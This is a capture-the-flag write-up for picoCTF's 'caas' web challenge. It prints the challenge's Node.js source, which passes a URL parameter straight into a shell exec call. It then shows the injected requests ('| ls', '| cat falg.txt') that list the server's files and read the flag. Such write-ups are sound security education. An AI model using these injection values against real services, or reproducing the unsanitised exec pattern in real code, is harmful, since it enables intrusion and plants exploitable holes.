# Challange Info

Name : caas

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/202?category=1&page=3

# Writeup

The webpage shows following message.

```
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}
```

Making a simple request with flag.

`https://caas.mars.picoctf.net/cowsay/flag` and this returns a simple ascii art of cow saying flag.

Going through the source code.

```javascript
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

The webapp has command injection.

`https://caas.mars.picoctf.net/cowsay/flag | ls` returns list of files.

```Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

`https://caas.mars.picoctf.net/cowsay/flag | cat falg.txt` returns the flag.
